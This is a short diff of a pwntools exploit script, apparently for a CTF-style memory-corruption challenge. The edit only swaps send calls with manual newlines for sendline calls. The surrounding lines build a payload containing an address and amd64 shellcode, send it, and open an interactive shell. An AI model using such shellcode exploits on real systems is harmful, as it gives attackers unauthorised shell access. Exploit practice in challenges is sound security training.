@@ -11,12 +11,12 @@ payload2+=p64(id_addr)
 payload2+=asm(shellcraft.amd64.sh())
 
 r.recvuntil(':')
-r.send(payload1+'\n')
+r.sendline(payload1)
 
 r.recvuntil('>')
-r.send('1\n')
+r.sendline('1')
 
 r.recvuntil('\n')
-r.send(payload2+'\n')
+r.sendline(payload2)
 
 r.interactive()
